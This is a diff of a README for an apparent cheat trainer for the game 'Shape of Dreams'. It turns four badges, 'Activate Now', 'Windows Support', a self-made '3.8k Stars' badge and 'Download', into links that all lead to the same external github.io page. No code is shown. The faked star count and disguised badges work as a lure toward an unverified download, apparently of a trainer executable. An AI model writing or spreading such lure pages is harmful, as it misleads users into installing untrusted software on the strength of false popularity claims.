@@ -12,10 +12,10 @@ Shape of Dreams is all about atmosphere and challenge. Sometimes, though, you wa
 Trainer tools are best used for **practice and testing**. Keep a backup of your save to preserve your main progress.
 
 
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-purple?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 3.8k Stars](https://img.shields.io/badge/⭐️%203.8k-Stars-yellow?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](#)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-purple?style=for-the-badge\&logo=rocket)](https://shape-of-dreams-trainer.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://shape-of-dreams-trainer.github.io/.github/)
+[![⭐️ 3.8k Stars](https://img.shields.io/badge/⭐️%203.8k-Stars-yellow?style=for-the-badge\&logo=github)](https://shape-of-dreams-trainer.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](https://shape-of-dreams-trainer.github.io/.github/)
 
 
 ---
